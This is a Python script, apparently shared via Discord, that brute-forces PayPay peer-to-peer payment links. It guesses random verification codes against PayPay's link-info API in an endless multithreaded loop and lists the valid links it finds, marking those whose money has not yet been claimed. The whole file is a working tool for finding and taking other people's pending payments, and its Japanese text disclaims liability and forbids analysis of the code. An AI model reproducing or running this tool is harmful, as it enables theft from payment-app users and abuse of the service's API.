import random, requests, time
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor
from os import system
tpe = ThreadPoolExecutor(max_workers=10)
valid = 0
invalid = 0
#functions--------------
init()
def g(rolls):
    data = "qwertyuioplkjhgfdsazxcvbnm1234567890QWERTYUIOPLKJHGFDSAZXCVBNM"
    result = ""
    while rolls >= 1:
        c = random.choice(data)
        result = c + result
        rolls = rolls - 1
    return result
headers = {
    'User-Agent': 'Mozilla/5.0 Chrome/109.0.0.0 Safari/537.36',
    'content-type': 'application/json'
}
#------------------------
def gen():
    global valid
    global invalid
    rels = g(16)
    link = f"https://www.paypay.ne.jp/app/v2/p2p-api/getP2PLinkInfo?verificationCode={rels}&client_uuid={g(8)}-{g(4)}-{g(4)}-{g(12)}"
    r = requests.get(f'{link}', headers=headers)
    if r.status_code == 429:
        print("レートリミットのため、数秒待機しています...")
        time.sleep(5)
    r = r.json()
    if r["header"]["resultCode"] == "S0000":
        valid += 1
        system(f"title Paypay Gen Checker! -- valid:{valid}  invalid:{invalid} created by とっきーﾅﾏｽﾃ#3929")
        if r["payload"]["orderStatus"] == "PENDING":
            print(Fore.CYAN + f"[!]  有効 : https://pay.paypay.ne.jp/{format(rels)}  金額 : " + str(r["payload"]["pendingP2PInfo"]["amount"]) + "  まだ受け取られていません")
        else:
            print(Fore.CYAN + f"[!]  有効 : https://pay.paypay.ne.jp/{format(rels)}  金額 : " + str(r["payload"]["pendingP2PInfo"]["amount"]) + "  受け取られている可能性があります")
    else:
        invalid += 1
        system(f"title Paypay Gen Checker! -- valid:{valid}  invalid:{invalid} created by とっきーﾅﾏｽﾃ#3929")
#-----------------------
print("\nこのツールを使用し何らかの法に問われた場合、この製作者である私は責任を負いません\n\nこのコードを解析し、改変等する事は禁止されています。 Created by とっきーﾅﾏｽﾃ - Collaborator: ぼーんじん\n\nここで無料配布されてます：https://discord.gg/tChS6Bpruz")
input("\n承認しました。(Enterで実行)")

system(f"title Token Gen Checker!  --  valid:0  invalid:0 created by とっきーﾅﾏｽﾃ#3929")
while True:
    tpe.submit(gen)

print(Style.RESET_ALL + "全ての作成・チェックが完了しました。")
input("Enterで終了")